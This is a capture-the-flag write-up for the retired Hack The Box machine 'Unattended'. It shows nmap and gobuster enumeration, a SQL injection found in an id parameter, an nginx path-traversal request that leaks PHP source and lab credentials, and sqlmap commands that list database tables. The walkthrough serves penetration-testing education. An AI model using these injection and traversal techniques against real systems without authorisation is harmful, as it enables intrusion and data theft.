# Unattended

This is the write-up for the box Unattended that got retired at the 24th August 2019.
My IP address was 10.10.14.4 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.126    unattended.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/unattended.nmap 10.10.10.126
```

```markdown
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
| Not valid before: 2018-12-19T09:43:58
|_Not valid after:  2021-09-13T09:43:58
```

Adding **nestedflanders.htb** to my hosts file.

## Checking HTTP and HTTPS

Browsing to both sites with the IP address gives us a blank page and browsing to **www.nestedflanders.htb** gives us the default Apache2 page.
We will run _gobuster_ against this to get any directories:
```markdown
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://10.10.10.126/
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u https://10.10.10.126/ -k
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://www.nestedflanders.htb -k
```

The pages with SSL need the _-k_ parameter to skip SSL verification. We get the following directories:
- /.htacces
- /.hta
- /.htpasswd
- /dev
- index.html
- index.php

All of them give us the HTTP code _403 Forbidden_ except for **/dev** that gives us a _301 Moved Temporarily_ and says:
> dev site has been moved to his own server

On **index.php** we find a real web page with more information.

```markdown
### main (/index.php?id=25)
Hello visitor,
we are very sorry to show you this ridiculous page but we had to restore our website to 2001-layout.
As a partial recover, we offer you a printed portfolio: just drop us an email with a contact request. 

### about (/index.php?id=465)
Hello visitor,
our Company is world wide leading expert about Nesting stuff.
We can nest almost everything after or before anything based on your needs.
Feel free to contact us with usual email addresses, our contact form is currently offline because of a recent attack. 

### contact (/index.php?id=587)
Hello visitor,
thanks for getting in touch with us!
Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.
Please come back later.
```

The most interesting about this, is that those 3 pages all have a different value in the _id_ query.
This page gets confused when we put a trailing _single quote_ at the end of the query:
```markdown
hxxps://www.nestedflanders.htb/index.php?id=465'
```

This brings us back to to the main page so we definitely got a **SQL Injection** here.

When we examine the _/dev_ directory in Burpsuite we can see it adds a trailing slash at the end of the path and that is the location were we are redirected.
As we know that this is nginx, we can abuse a misconfiguration that [breaks the parser logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) of that.
In short it looks like this:
```markdown
GET /dev../html/index.php 
```

And this gives us the source code of **index.php**. This file can be found in this repository as it has important information.
- $username = "nestedflanders";
- $password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
- include "6fb17817efb4131ae4ae1acae0f7fd48.php";
  - /* removed everything because of undergoing investigation, please check dev and staging */


### SQL Injection

If we try out some SQLi we find out that we get different responses with **UNION Injections**. For example like this, we get no content on the page:
```markdown
GET /index.php?id=465'+union+select+1--+-
```

Lets send the request to SQLMap:
```markdown
GET /index.php?id=465 HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=pj052g0hbe1jsbslvn86d0bg51
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
```markdown
sqlmap -r id.req -p id --batch

sqlmap -r id.req -p id --batch --dbs
- We get the table neddy (that we also can find in the source code)

sqlmap -r id.req -p id --batch -D neddy --tables
```

We got the tables from SQLMap:
```markdown
+--------------+
| config       |
| customers    |
| employees    |
| filepath     |
| idname       |
| offices      |
| orderdetails |
| orders       |
| payments     |
| productlines |
| products     |
+--------------+
```


